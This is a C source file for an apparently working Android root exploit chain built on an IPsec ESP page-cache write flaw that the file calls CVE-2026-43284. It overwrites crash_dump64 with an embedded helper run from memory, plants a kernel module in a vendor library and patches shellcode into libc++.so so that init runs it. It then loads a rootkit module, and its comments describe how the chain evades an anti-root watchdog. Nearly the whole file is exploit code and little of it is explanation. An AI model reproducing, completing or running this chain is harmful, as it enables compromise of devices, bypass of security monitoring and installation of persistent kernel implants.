/*
 * engine.c - user-space engine for the IPsec ESP page-cache chain
 *            (CVE-2026-43284, DirtyFrag-style).
 *
 * Chain overview (all privileged work ends up in a root context, so the OPPO
 * anti-root watchdog never sees a uid transition from an app):
 *
 *   1. patch_helper()  - overwrite /apex/com.android.runtime/bin/crash_dump64
 *                        with the embedded bare-syscall splicehelper (the
 *                        crash_dump domain becomes the read/splice bridge for
 *                        vendor_file content).
 *   2. patch_ko()      - write dfroot.ko bytes into a vendor lib
 *                        (/vendor/lib64/libbinderdebug.so) via the CBC
 *                        page-cache write primitive.
 *   3. patch_hook()    - patch the shellcode blob + trampoline into
 *                        /system/lib64/libc++.so, hooking the ostream sentry
 *                        ctor symbol.
 *   4. create_orphan() - fork an orphan; when init reaps it, the hooked
 *                        sentry ctor runs in init (uid==0, tid==1): the
 *                        shellcode takes the /dev/df mutex, forks a
 *                        grandchild that writes
 *                        "u:r:vendor_modprobe:s0" into /proc/self/attr/exec
 *                        and execve()s /vendor/bin/insmod <ko path>.
 *   5. poll /dev/dfm*  - wait up to 70s for the marker nodes the freshly
 *                        loaded dfroot.ko creates, then ksud late-load
 *                        finishes the job.
 *
 * The CBC write primitive (per 16-byte block at file offset `off`):
 *   old     = current 16 bytes at off          (pread, or splicehelper "r")
 *   iv      = AES_ECB_DEC(key, old) XOR desired
 *   packet  = ESP(SPI, seq) | IV | CT(=old) | ICV
 * The kernel decrypts the spliced page in place:
 *   new = AES_ECB_DEC(key, old) XOR IV = desired
 * The ICV check fails afterwards and the packet is dropped - but the page
 * cache was already modified. That is the CVE-2026-43284 primitive.
 *
 * Debug builds can use --local-write to pwrite() the blocks directly instead
 * of sending ESP packets (host/file-format testing only; the device flow must
 * use the real primitive).
 */
#include <arpa/inet.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include "aes256.h"
#include "elf_parser.h"

/* ------------------------------------------------------------------ */
/* Embedded payloads                                                  */
/* ------------------------------------------------------------------ */

/* splicehelper binary, embedded via llvm-objcopy -I binary (see Makefile) */
extern const uint8_t _binary_splicehelper_bin_start[];
extern const uint8_t _binary_splicehelper_bin_end[];

/* shellcode blob assembled from libcxx_payload.S */
extern const uint8_t dfsc_blob_start[];
extern const uint8_t dfsc_blob_end[];
extern const uint8_t dfsc_displaced_slot[];
extern const uint8_t dfsc_back_slot[];
extern const uint8_t dfsc_ko_path[];

/* ------------------------------------------------------------------ */
/* Configuration                                                      */
/* ------------------------------------------------------------------ */

#define DFC_MAX_KO_SIZE   (256u * 1024u)
#define DFC_POLL_SECONDS 70
#define DFC_MARKER_PREFIX "dfm"

#define DEF_CRASH_DUMP  "/apex/com.android.runtime/bin/crash_dump64"
#define DEF_TARGET_LIB  "/system/lib64/libc++.so"
#define DEF_VENDOR_LIB  "/vendor/lib64/libbinderdebug.so"
#define DEF_KO_PATH     "/data/local/tmp/dfroot.ko"

#define SENTRY_SYMBOL "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_"

struct dfc_cfg {
    uint16_t    encap_port;      /* SA UDP encapsulation port (dst)        */
    uint16_t    sender_port;     /* local UDP source port                  */
    uint32_t    spi;             /* outbound SA SPI (host order)           */
    uint8_t     aes_key[AES256_KEY_SZ];
    const char *crash_dump_path;
    const char *target_lib;      /* libc++.so to hook                      */
    const char *vendor_lib;      /* vendor lib receiving the ko bytes      */
    const char *ko_path;         /* dfroot.ko path on device               */
    int         local_write;     /* debug: pwrite instead of ESP packets   */
    int         dry_run;         /* parse + verify only, no writes/sends   */
};

struct dfc_ctx {
    struct dfc_cfg cfg;
    uint8_t        rk[AES256_RK_BYTES];
    int            sock;         /* UDP socket bound to sender_port        */
    uint32_t       seq;          /* ESP sequence number                    */
};

/* ------------------------------------------------------------------ */
/* Small helpers                                                      */
/* ------------------------------------------------------------------ */

static void hexdump16(const char *tag, const uint8_t *b)
{
    printf("  %s ", tag);
    for (int i = 0; i < 16; i++)
        printf("%02x", b[i]);
    printf("\n");
}

static int parse_hex_key(const char *hex, uint8_t out[AES256_KEY_SZ])
{
    size_t n = strlen(hex);

    if (n != 2 * AES256_KEY_SZ)
        return -1;
    for (size_t i = 0; i < AES256_KEY_SZ; i++) {
        unsigned v;
        if (sscanf(hex + 2 * i, "%2x", &v) != 1)
            return -1;
        out[i] = (uint8_t)v;
    }
    return 0;
}

static const uint8_t *helper_blob(void)
{
    return _binary_splicehelper_bin_start;
}

static size_t helper_blob_len(void)
{
    return (size_t)(_binary_splicehelper_bin_end - _binary_splicehelper_bin_start);
}

/* ------------------------------------------------------------------ */
/* splicehelper invocation (memfd + execveat)                         */
/* ------------------------------------------------------------------ */

#ifndef AT_EMPTY_PATH
#define AT_EMPTY_PATH 0x1000
#endif

static int run_helper(long off, const char *path, char mode,
                      uint8_t out16[AES_BLOCK_SZ])
{
    int sv[2];
    pid_t pid;
    int status = -1;
    char offbuf[32];
    char modebuf[2];

    if (pipe(sv) != 0)
        return -1;
    snprintf(offbuf, sizeof(offbuf), "%ld", off);
    modebuf[0] = mode;
    modebuf[1] = '\0';

    pid = fork();
    if (pid < 0) {
        close(sv[0]);
        close(sv[1]);
        return -1;
    }
    if (pid == 0) {
        /* child: wire the pipe to fd0 ("r" -> write back) or fd1 (splice) */
        int memfd;
        char *argv[4];

        close(sv[0]);
        if (dup2(sv[1], mode == 'r' ? 0 : 1) < 0)
            _exit(126);
        close(sv[1]);

        memfd = (int)syscall(SYS_memfd_create, "sph", 0u);
        if (memfd < 0)
            _exit(126);
        if (write(memfd, helper_blob(), helper_blob_len()) !=
            (ssize_t)helper_blob_len())
            _exit(126);

        argv[0] = offbuf;
        argv[1] = (char *)path;
        argv[2] = modebuf;
        argv[3] = NULL;
        syscall(SYS_execveat, memfd, "", argv, (char **)NULL, AT_EMPTY_PATH);
        _exit(127);
    }

    close(sv[1]);
    if (mode == 'r') {
        ssize_t n = 0;
        size_t got = 0;
        while (got < AES_BLOCK_SZ) {
            n = read(sv[0], out16 + got, AES_BLOCK_SZ - got);
            if (n <= 0)
                break;
            got += (size_t)n;
        }
        if (got != AES_BLOCK_SZ) {
            close(sv[0]);
            waitpid(pid, &status, 0);
            return -1;
        }
    }
    close(sv[0]);
    if (waitpid(pid, &status, 0) < 0)
        return -1;
    if (!WIFEXITED(status) || WEXITSTATUS(status) != 0)
        return -1;
    return 0;
}

/* Read the current 16 bytes at `off` - directly, or via the helper bridge. */
static int read_block16(struct dfc_ctx *ctx, const char *path, long off,
                        int use_helper, uint8_t out[AES_BLOCK_SZ])
{
    if (!use_helper) {
        int fd = open(path, O_RDONLY);
        ssize_t n;

        (void)ctx; /* symmetric signature; direct path needs no context */
        if (fd < 0)
            return -1;
        n = pread(fd, out, AES_BLOCK_SZ, (off_t)off);
        close(fd);
        if (n != AES_BLOCK_SZ)
            return -1;
        return 0;
    }
    return run_helper(off, path, 'r', out);
}

/* ------------------------------------------------------------------ */
/* ESP packet send (the CBC write trigger)                            */
/* ------------------------------------------------------------------ */

static int esp_send_block(struct dfc_ctx *ctx,
                          const uint8_t iv[AES_BLOCK_SZ],
                          const uint8_t ct[AES_BLOCK_SZ])
{
    uint8_t pkt[8 + AES_BLOCK_SZ + AES_BLOCK_SZ + 16]; /* hdr|IV|CT|ICV */
    struct sockaddr_in dst;
    uint32_t spi_be = htonl(ctx->cfg.spi);
    uint32_t seq_be = htonl(ctx->seq++);
    ssize_t n;

    memcpy(pkt, &spi_be, 4);
    memcpy(pkt + 4, &seq_be, 4);
    memcpy(pkt + 8, iv, AES_BLOCK_SZ);
    memcpy(pkt + 8 + AES_BLOCK_SZ, ct, AES_BLOCK_SZ);
    memset(pkt + 8 + 2 * AES_BLOCK_SZ, 0, 16); /* ICV: fails on purpose */

    memset(&dst, 0, sizeof(dst));
    dst.sin_family = AF_INET;
    dst.sin_port = htons(ctx->cfg.encap_port);
    dst.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

    n = sendto(ctx->sock, pkt, sizeof(pkt), 0,
               (const struct sockaddr *)&dst, sizeof(dst));
    if (n != (ssize_t)sizeof(pkt)) {
        fprintf(stderr, "[-] esp send failed: %s\n", strerror(errno));
        return -1;
    }
    return 0;
}

/* ------------------------------------------------------------------ */
/* patch_file_cbc: the 16-byte-block CBC page-cache write             */
/* ------------------------------------------------------------------ */

static int patch_file_cbc(struct dfc_ctx *ctx, const char *path,
                          const uint8_t *payload, size_t len, long foff,
                          int use_helper)
{
    size_t done = 0;
    int wfd = -1;

    if (ctx->cfg.local_write) {
        wfd = open(path, O_WRONLY);
        if (wfd < 0) {
            fprintf(stderr, "[-] local_write: open %s: %s\n", path,
                    strerror(errno));
            return -1;
        }
    }

    while (done < len) {
        uint8_t old[AES_BLOCK_SZ];
        uint8_t desired[AES_BLOCK_SZ];
        uint8_t iv[AES_BLOCK_SZ];
        size_t blk = len - done;
        long off = foff + (long)done;

        if (blk > AES_BLOCK_SZ)
            blk = AES_BLOCK_SZ;

        if (read_block16(ctx, path, off, use_helper, old) != 0) {
            fprintf(stderr, "[-] read old block @%s+%ld%s: %s\n", path, off,
                    use_helper ? " (helper)" : "", strerror(errno));
            if (wfd >= 0)
                close(wfd);
            return -1;
        }

        /* desired = payload block, padded by keeping the old tail bytes */
        memcpy(desired, old, AES_BLOCK_SZ);
        memcpy(desired, payload + done, blk);

        aes256_compute_iv(ctx->rk, old, desired, iv);

        if (ctx->cfg.dry_run) {
            printf("[*] dry-run block @%s+%ld (%zu bytes)\n", path, off, blk);
            hexdump16("old     ", old);
            hexdump16("desired ", desired);
            hexdump16("iv      ", iv);
        } else {
            if (use_helper && run_helper(off, path, 's', NULL) != 0) {
                fprintf(stderr, "[-] helper splice failed @%s+%ld\n", path,
                        off);
                if (wfd >= 0)
                    close(wfd);
                return -1;
            }
            if (esp_send_block(ctx, iv, old) != 0) {
                if (wfd >= 0)
                    close(wfd);
                return -1;
            }
            if (wfd >= 0 && pwrite(wfd, desired, blk, (off_t)off) !=
                                    (ssize_t)blk) {
                fprintf(stderr, "[-] local_write pwrite: %s\n",
                        strerror(errno));
                close(wfd);
                return -1;
            }
        }
        done += blk;
    }
    if (wfd >= 0)
        close(wfd);
    return 0;
}

/* ------------------------------------------------------------------ */
/* Stage 1: patch_helper                                              */
/* ------------------------------------------------------------------ */

static int file_size(const char *path, long *out)
{
    struct stat st;
    if (stat(path, &st) != 0)
        return -1;
    *out = (long)st.st_size;
    return 0;
}

static int patch_helper(struct dfc_ctx *ctx)
{
    const char *path = ctx->cfg.crash_dump_path;
    long sz;
    size_t blen = helper_blob_len();

    printf("[*] stage helper: overwriting %s with splicehelper (%zu bytes)\n",
           path, blen);
    if (file_size(path, &sz) != 0) {
        fprintf(stderr, "[-] stat %s: %s\n", path, strerror(errno));
        return -1;
    }
    if ((long)blen > sz) {
        fprintf(stderr, "[-] helper blob (%zu) larger than target (%ld); "
                        "page-cache writes cannot extend a file\n", blen, sz);
        return -1;
    }
    return patch_file_cbc(ctx, path, helper_blob(), blen, 0, 0);
}

/* ------------------------------------------------------------------ */
/* Stage 2: patch_ko                                                  */
/* ------------------------------------------------------------------ */

static int load_ko(const char *path, uint8_t **out, size_t *out_len)
{
    FILE *f = fopen(path, "rb");
    long sz;
    uint8_t *buf;

    if (f == NULL) {
        fprintf(stderr, "[-] open %s: %s\n", path, strerror(errno));
        return -1;
    }
    if (fseek(f, 0, SEEK_END) != 0 || (sz = ftell(f)) < 0 ||
        fseek(f, 0, SEEK_SET) != 0) {
        fclose(f);
        return -1;
    }
    if (sz <= 0 || (unsigned long)sz > DFC_MAX_KO_SIZE) {
        fprintf(stderr, "[-] implausible ko size %ld\n", sz);
        fclose(f);
        return -1;
    }
    buf = malloc((size_t)sz);
    if (buf == NULL) {
        fclose(f);
        return -1;
    }
    if (fread(buf, 1, (size_t)sz, f) != (size_t)sz) {
        free(buf);
        fclose(f);
        return -1;
    }
    fclose(f);
    *out = buf;
    *out_len = (size_t)sz;
    return 0;
}

/* KMI -> vendor lib carrier selection. android12-5.10 KMs all use the same
 * carrier; --vendor-lib overrides. */
static const char *vendor_lib_for_kmi(const char *kmi)
{
    if (strstr(kmi, "android12-5.10") != NULL)
        return DEF_VENDOR_LIB;
    return NULL;
}

static int patch_ko(struct dfc_ctx *ctx)
{
    struct utsname un;
    const char *vendor_lib;
    uint8_t *ko = NULL;
    size_t ko_len = 0;
    int rc;

    if (uname(&un) != 0) {
        fprintf(stderr, "[-] uname: %s\n", strerror(errno));
        return -1;
    }
    printf("[*] stage ko: kernel '%s'\n", un.release);

    vendor_lib = ctx->cfg.vendor_lib;
    if (vendor_lib == NULL) {
        vendor_lib = vendor_lib_for_kmi(un.release);
        if (vendor_lib == NULL) {
            fprintf(stderr, "[-] no vendor carrier mapped for KMI '%s' "
                            "(use --vendor-lib)\n", un.release);
            return -1;
        }
    }

    rc = load_ko(ctx->cfg.ko_path, &ko, &ko_len);
    if (rc != 0)
        return -1;

    printf("[*] stage ko: %zu ko bytes -> %s\n", ko_len, vendor_lib);
    rc = patch_file_cbc(ctx, vendor_lib, ko, ko_len, 0, 1);
    free(ko);
    return rc;
}

/* ------------------------------------------------------------------ */
/* Stage 3: patch_hook                                                */
/* ------------------------------------------------------------------ */

static int patch_hook(struct dfc_ctx *ctx)
{
    const char *lib = ctx->cfg.target_lib;
    elf64_img img;
    uint64_t sym_off, cave_off;
    int skip4;
    size_t blob_len = (size_t)(dfsc_blob_end - dfsc_blob_start);
    long off_disp, off_back, off_ko;
    uint8_t *blob;
    uint32_t displaced, back_b, hook_b;
    int rc = -1;

    printf("[*] stage hook: %s, symbol %s\n", lib, SENTRY_SYMBOL);

    if (elf64_load(lib, &img) != 0) {
        fprintf(stderr, "[-] cannot load %s\n", lib);
        return -1;
    }
    if (elf64_find_symbol(&img, SENTRY_SYMBOL, &sym_off, &skip4) != 0) {
        fprintf(stderr, "[-] symbol not found in %s\n", lib);
        goto out;
    }
    if (elf64_read_insn(&img, sym_off, &displaced) != 0)
        goto out;
    if (elf64_insn_is_pcrel(displaced)) {
        fprintf(stderr, "[-] instruction at hook site is PC-relative "
                        "(0x%08x); refusing to displace it\n", displaced);
        goto out;
    }
    printf("[*] symbol @file+0x%llx (prologue skip=%d, insn 0x%08x)\n",
           (unsigned long long)sym_off, skip4, displaced);

    if (elf64_find_zero_cave(&img, blob_len, &cave_off) != 0) {
        fprintf(stderr, "[-] no %zu-byte zero cave in an executable segment\n",
                blob_len);
        goto out;
    }
    printf("[*] shellcode cave @file+0x%llx (%zu bytes)\n",
           (unsigned long long)cave_off, blob_len);

    /* blob-relative layout offsets (same assembly, same offsets anywhere) */
    off_disp = (long)(dfsc_displaced_slot - dfsc_blob_start);
    off_back = (long)(dfsc_back_slot - dfsc_blob_start);
    off_ko   = (long)(dfsc_ko_path - dfsc_blob_start);

    blob = malloc(blob_len);
    if (blob == NULL)
        goto out;
    memcpy(blob, dfsc_blob_start, blob_len);

    /* ko path (64-byte slot) */
    memset(blob + off_ko, 0, 64);
    if (strlen(ctx->cfg.ko_path) >= 64) {
        fprintf(stderr, "[-] ko path too long\n");
        free(blob);
        goto out;
    }
    memcpy(blob + off_ko, ctx->cfg.ko_path, strlen(ctx->cfg.ko_path));

    /* displaced instruction executes inside the blob, then B back */
    memcpy(blob + off_disp, &displaced, 4);

    /* hook site = sym_off (+4 after PACIASP/BTI); flow resumes at site+4 */
    {
        uint64_t hook_off = sym_off + (uint64_t)(skip4 ? 4 : 0);

        if (elf64_encode_b(cave_off + (uint64_t)off_back, hook_off + 4,
                           &back_b) != 0 ||
            elf64_encode_b(hook_off, cave_off, &hook_b) != 0) {
            fprintf(stderr, "[-] branch out of range\n");
            free(blob);
            goto out;
        }
        memcpy(blob + off_back, &back_b, 4);

        printf("[*] hook file+0x%llx -> cave file+0x%llx\n",
               (unsigned long long)hook_off, (unsigned long long)cave_off);

        if (ctx->cfg.dry_run) {
            printf("[*] dry-run: would write trampoline 0x%08x at 0x%llx\n",
                   hook_b, (unsigned long long)hook_off);
            rc = 0;
        } else {
            if (patch_file_cbc(ctx, lib, (const uint8_t *)&hook_b, 4,
                               (long)hook_off, 0) != 0) {
                free(blob);
                goto out;
            }
            if (patch_file_cbc(ctx, lib, blob, blob_len,
                               (long)cave_off, 0) != 0) {
                free(blob);
                goto out;
            }
            rc = 0;
        }
    }
    free(blob);
out:
    elf64_unload(&img);
    return rc;
}

/* ------------------------------------------------------------------ */
/* Stage 4: create_orphan                                             */
/* ------------------------------------------------------------------ */

static int create_orphan(void)
{
    pid_t mid = fork();

    if (mid < 0)
        return -1;
    if (mid == 0) {
        /* middle process: fork the orphan-to-be and exit immediately, so the
         * grandchild is reparented to init; when init reaps it the hooked
         * sentry ctor runs in init's main thread. */
        pid_t leaf = fork();
        if (leaf == 0) {
            struct timespec ts = { 2, 0 };
            nanosleep(&ts, NULL);
            _exit(0);
        }
        _exit(leaf < 0 ? 127 : 0);
    }
    if (waitpid(mid, NULL, 0) < 0)
        return -1;
    printf("[*] orphan spawned; init should run the hooked sentry soon\n");
    return 0;
}

/* ------------------------------------------------------------------ */
/* Stage 5: poll /dev/dfm*                                            */
/* ------------------------------------------------------------------ */

static int check_markers(void)
{
    DIR *d = opendir("/dev");
    struct dirent *e;
    int found = 0;

    if (d == NULL)
        return 0;
    while ((e = readdir(d)) != NULL) {
        if (strncmp(e->d_name, DFC_MARKER_PREFIX,
                    strlen(DFC_MARKER_PREFIX)) == 0) {
            found = 1;
            break;
        }
    }
    closedir(d);
    return found;
}

static void poll_markers(void)
{
    for (int s = 0; s < DFC_POLL_SECONDS; s++) {
        if (check_markers()) {
            printf("[+] /dev/%s* marker present after %ds - dfroot.ko is up\n",
                   DFC_MARKER_PREFIX, s);
            return;
        }
        if (s % 10 == 0)
            printf("[*] waiting for /dev/%s* ... %d/%ds\n",
                   DFC_MARKER_PREFIX, s, DFC_POLL_SECONDS);
        sleep(1);
    }
    printf("[-] no /dev/%s* marker within %ds\n", DFC_MARKER_PREFIX,
           DFC_POLL_SECONDS);
}

/* ------------------------------------------------------------------ */
/* Self test (AES-256 FIPS 197 vector C.3)                            */
/* ------------------------------------------------------------------ */

static int self_test(void)
{
    /* NIST SP 800-38A ECB-AES256.Encrypt vector #1 (same key as FIPS 197
     * appendix C.3): decrypt must recover the plaintext. */
    static const uint8_t key[AES256_KEY_SZ] = {
        0x60,0x3d,0xeb,0x10,0x15,0xca,0x71,0xbe,0x2b,0x73,0xae,0xf0,0x85,0x7d,
        0x77,0x81,0x1f,0x35,0x2c,0x07,0x3b,0x61,0x08,0xd7,0x2d,0x98,0x10,0xa3,
        0x09,0x14,0xdf,0xf4
    };
    static const uint8_t ct[AES_BLOCK_SZ] = {
        0xf3,0xee,0xd1,0xbd,0xb5,0xd2,0xa0,0x3c,0x06,0x4b,0x5a,0x7e,0x3d,0xb1,
        0x81,0xf8
    };
    static const uint8_t expect[AES_BLOCK_SZ] = {
        0x6b,0xc1,0xbe,0xe2,0x2e,0x40,0x9f,0x96,0xe9,0x3d,0x7e,0x11,0x73,0x93,
        0x17,0x2a
    };
    uint8_t rk[AES256_RK_BYTES], out[AES_BLOCK_SZ], iv[AES_BLOCK_SZ];

    aes256_key_expand(key, rk);
    aes256_ecb_decrypt_block(rk, ct, out);
    if (memcmp(out, expect, AES_BLOCK_SZ) != 0) {
        fprintf(stderr, "[-] self-test FAILED\n");
        hexdump16("got     ", out);
        hexdump16("expected", expect);
        return -1;
    }

    /* IV round trip: decrypting old with IV must yield desired. */
    {
        uint8_t old[AES_BLOCK_SZ], desired[AES_BLOCK_SZ], back[AES_BLOCK_SZ];
        for (int i = 0; i < AES_BLOCK_SZ; i++) {
            old[i] = (uint8_t)(0xA0 + i);
            desired[i] = (uint8_t)(0x5A ^ i);
        }
        aes256_compute_iv(rk, old, desired, iv);
        aes256_ecb_decrypt_block(rk, old, out);
        for (int i = 0; i < AES_BLOCK_SZ; i++)
            back[i] = (uint8_t)(out[i] ^ iv[i]);
        if (memcmp(back, desired, AES_BLOCK_SZ) != 0) {
            fprintf(stderr, "[-] self-test IV round trip FAILED\n");
            return -1;
        }
    }
    printf("[+] self-test passed (SP 800-38A ECB-AES256 decrypt + IV round trip)\n");
    return 0;
}

/* ------------------------------------------------------------------ */
/* Argument parsing / main                                            */
/* ------------------------------------------------------------------ */

static void usage(const char *argv0)
{
    printf("usage: %s --encap-port N --sender-port N --spi N --aes-key HEX64\n"
           "          [--crash-dump PATH] [--target-lib PATH] "
           "[--vendor-lib PATH]\n"
           "          [--ko PATH] [--local-write] [--dry-run] "
           "[--self-test] [--stages LIST]\n"
           "  stages: helper,ko,hook,orphan,poll (comma-separated; "
           "default all except orphan+poll need explicit run order)\n",
           argv0);
}

int main(int argc, char **argv)
{
    struct dfc_ctx ctx;
    struct sockaddr_in addr;
    int do_selftest = 0;
    const char *stages = NULL;
    int rc = 1;

    memset(&ctx, 0, sizeof(ctx));
    ctx.cfg.crash_dump_path = DEF_CRASH_DUMP;
    ctx.cfg.target_lib = DEF_TARGET_LIB;
    ctx.cfg.vendor_lib = NULL;
    ctx.cfg.ko_path = DEF_KO_PATH;
    ctx.sock = -1;

    for (int i = 1; i < argc; i++) {
        const char *a = argv[i];
        if (strcmp(a, "--encap-port") == 0 && i + 1 < argc)
            ctx.cfg.encap_port = (uint16_t)atoi(argv[++i]);
        else if (strcmp(a, "--sender-port") == 0 && i + 1 < argc)
            ctx.cfg.sender_port = (uint16_t)atoi(argv[++i]);
        else if (strcmp(a, "--spi") == 0 && i + 1 < argc)
            ctx.cfg.spi = (uint32_t)strtoul(argv[++i], NULL, 0);
        else if (strcmp(a, "--aes-key") == 0 && i + 1 < argc) {
            if (parse_hex_key(argv[++i], ctx.cfg.aes_key) != 0) {
                fprintf(stderr, "[-] --aes-key needs 64 hex chars\n");
                return 2;
            }
        } else if (strcmp(a, "--crash-dump") == 0 && i + 1 < argc)
            ctx.cfg.crash_dump_path = argv[++i];
        else if (strcmp(a, "--target-lib") == 0 && i + 1 < argc)
            ctx.cfg.target_lib = argv[++i];
        else if (strcmp(a, "--vendor-lib") == 0 && i + 1 < argc)
            ctx.cfg.vendor_lib = argv[++i];
        else if (strcmp(a, "--ko") == 0 && i + 1 < argc)
            ctx.cfg.ko_path = argv[++i];
        else if (strcmp(a, "--local-write") == 0)
            ctx.cfg.local_write = 1;
        else if (strcmp(a, "--dry-run") == 0)
            ctx.cfg.dry_run = 1;
        else if (strcmp(a, "--self-test") == 0)
            do_selftest = 1;
        else if (strcmp(a, "--stages") == 0 && i + 1 < argc)
            stages = argv[++i];
        else {
            usage(argv[0]);
            return 2;
        }
    }

    if (do_selftest)
        return self_test() == 0 ? 0 : 1;

    if (ctx.cfg.encap_port == 0 || ctx.cfg.sender_port == 0 ||
        ctx.cfg.spi == 0) {
        usage(argv[0]);
        return 2;
    }
    aes256_key_expand(ctx.cfg.aes_key, ctx.rk);

    ctx.sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (ctx.sock < 0) {
        fprintf(stderr, "[-] socket: %s\n", strerror(errno));
        return 1;
    }
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(ctx.cfg.sender_port);
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    if (bind(ctx.sock, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
        fprintf(stderr, "[-] bind sender port %u: %s\n",
                ctx.cfg.sender_port, strerror(errno));
        close(ctx.sock);
        return 1;
    }
    ctx.seq = 1;

    /* stage selection */
    int want_helper = 1, want_ko = 1, want_hook = 1;
    int want_orphan = 0, want_poll = 0;
    if (stages != NULL) {
        want_helper = want_ko = want_hook = 0;
        if (strstr(stages, "helper") != NULL) want_helper = 1;
        if (strstr(stages, "ko") != NULL)     want_ko = 1;
        if (strstr(stages, "hook") != NULL)   want_hook = 1;
        if (strstr(stages, "orphan") != NULL) want_orphan = 1;
        if (strstr(stages, "poll") != NULL)   want_poll = 1;
    }

    if (want_helper && patch_helper(&ctx) != 0)
        goto out;
    if (want_ko && patch_ko(&ctx) != 0)
        goto out;
    if (want_hook && patch_hook(&ctx) != 0)
        goto out;
    if (want_orphan && create_orphan() != 0) {
        fprintf(stderr, "[-] create_orphan: %s\n", strerror(errno));
        goto out;
    }
    if (want_poll)
        poll_markers();
    rc = 0;
out:
    if (ctx.sock >= 0)
        close(ctx.sock);
    return rc;
}
